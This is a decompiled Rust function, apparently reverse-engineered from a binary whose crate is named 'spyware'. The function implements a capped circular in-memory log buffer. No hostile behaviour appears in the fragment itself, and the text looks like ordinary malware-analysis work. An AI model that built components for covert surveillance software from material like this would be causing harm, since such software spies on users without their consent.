void _ZN7spyware7logging13memory_logger18CircularMemoryLogs9write_log17h24aec65a22a6ad29E
               (long param_1,undefined4 *param_2)

{
  long lVar1;
  ulong uVar2;
  byte extraout_DL;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  
  if (*(ulong *)(param_1 + 0x28) <= *(ulong *)(param_2 + 4)) {
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h46afe0b9deda2fc5E(param_2);
    return;
  }
                    /* try { // try from 0015712f to 00157144 has its CatchHandler @ 001571fe */
  _ZN3std4sync6rwlock15RwLock_LT_T_GT_5write17h0b8adb0c1087dc7aE(&local_48,param_1);
  lVar1 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h893dc0961babf8c6E(&local_48);
  local_38 = *(undefined8 *)(param_2 + 4);
  local_48 = *param_2;
  uStack_44 = param_2[1];
  uStack_40 = param_2[2];
  uStack_3c = param_2[3];
                    /* try { // try from 00157168 to 00157179 has its CatchHandler @ 001571fc */
  _ZN5alloc3vec16Vec_LT_T_C_A_GT_4push17h796f5763df20dff9E
            (lVar1 + 0x10,&local_48,&PTR_s_src_logging_memory_logger_rs_001b9c28);
  uVar2 = _ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E
                    (*(undefined8 *)(lVar1 + 0x18),*(undefined8 *)(lVar1 + 0x20));
  if (*(ulong *)(param_1 + 0x28) <= uVar2) {
    do {
                    /* try { // try from 001571a0 to 001571b7 has its CatchHandler @ 0015720b */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_6remove17h6cb891fd1a2f8deaE
                (&local_48,lVar1 + 0x10,0,&PTR_s_src_logging_memory_logger_rs_001b9c40);
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h46afe0b9deda2fc5E(&local_48);
      uVar2 = _ZN7spyware7logging13memory_logger18compute_used_chars17h6cad6d693caf9651E
                        (*(undefined8 *)(lVar1 + 0x18),*(undefined8 *)(lVar1 + 0x20));
    } while (*(ulong *)(param_1 + 0x28) <= uVar2);
  }
  _ZN4core3ptr108drop_in_place_LT_std__sync__rwlock__RwLockWriteGuard_LT_alloc__vec__Vec_LT_alloc__string__String_GT__GT__GT_17h5706396115e72401E
            (lVar1,extraout_DL & 1);
  return;
}